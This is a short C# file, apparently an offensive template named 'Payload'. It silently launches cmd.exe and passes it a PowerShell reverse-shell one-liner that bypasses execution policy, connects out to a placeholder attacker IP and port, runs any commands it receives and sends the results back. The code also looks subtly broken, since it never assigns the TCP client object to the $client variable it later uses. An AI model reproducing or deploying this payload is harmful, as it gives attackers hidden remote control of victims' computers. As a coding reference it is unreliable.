using System;
using System.Diagnostics;

namespace Templates
{
    class Payload
    {
        static void Main() {
            Process command = new Process();
            command.StartInfo.FileName = "cmd.exe";
            command.StartInfo.RedirectStandardInput = true;
            command.StartInfo.RedirectStandardOutput = true;
            command.StartInfo.CreateNoWindow = true;
            command.Start();
            command.StandardInput.WriteLine("powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"<ip>\",\"<port>\");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()");
            command.StandardInput.Flush();
            command.StandardInput.Close();
        }
    }
}
